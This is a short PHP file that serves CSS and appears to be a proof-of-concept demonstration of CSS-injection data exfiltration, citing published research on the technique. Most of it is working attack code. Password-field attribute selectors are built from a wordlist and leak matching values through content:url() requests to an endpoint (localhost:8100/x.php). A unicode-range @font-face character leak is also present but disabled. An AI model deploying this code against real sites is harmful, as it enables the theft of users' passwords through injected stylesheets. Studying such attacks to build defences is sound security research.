<?php

/*
CSS from untrusted sources is no bueno ...
- https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense
- https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html
- http://vulnerabledoma.in/poc_unicode-range2.html
- https://medium.com/bugbountywriteup/exfiltration-via-css-injection-4e999f63097d 
- https://gist.github.com/d0nutptr/
- https://github.com/dxa4481/cssInjection
- http://p42.us/css/
- https://www.troopers.de/media/filer_public/47/19/4719cfce-8be9-4739-a7b4-42f9761a9fd6/tr12_day02_heiderich_got_ur_nose.pdf
*/

header("Content-Type: text/css");
header('Cache-Control: no-store');

$id = uniqid();

function hexicode($in) {
	return implode("", array_map(function($x) {
		return sprintf("%04X",ord($x));
	}, str_split($in)));
}

?>
#style-self-external-2  {
  font-family: attack;
}

#style-self-external-2:before {
	content: 'Changed (css from another domain) ... ';
}
<?php
// https://github.com/berzerk0/Probable-Wordlists

$doc = file_get_contents('passwords.txt');
$hash = md5($doc);

$passwords = explode("\n", $doc);
$endpoint = '//localhost:8100/x.php';

// Exfiltrate with CSS ... not even CSS is safe
foreach ($passwords as $pass) {
	if (strlen($pass) < 4) {
		continue;
	}
	echo "input[name=password i][value^={$pass}]{content:url('{$endpoint}?p={$pass}');}";
}
?>
/*
#style-self-external-2:after {content: url("http://localhost:8100/x.php?i=<?php echo $id; ?>&from-css=1") attr(value);
}
*/
  
/* @import url('https://fonts.googleapis.com/css?family=Nixie+One'); */

<?php foreach (range('!', '~') as $char): continue; ?>
@font-face{
	font-family:attack;
	src:url('http://localhost:8100/x.php?i=<?php echo $id; ?>&l=<?php echo $char; ?>');
	unicode-range:U+<?php echo hexicode($char); ?>;
}
<?php endforeach;